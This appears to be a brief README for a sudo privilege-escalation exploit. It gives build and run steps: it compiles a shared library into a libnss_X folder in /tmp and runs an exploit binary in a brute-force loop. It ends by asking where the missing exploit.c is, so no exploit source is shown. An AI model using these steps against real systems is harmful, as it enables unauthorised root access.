# sudo-exp
cd /tmp


mkdir libnss_X


gcc -fpic -shared -nostdlib -o libnss_X/X.so.2 la.c


for i in {1..128000}; do echo -n "try number $i "; ./exploit; done



where is exploit.c？？？
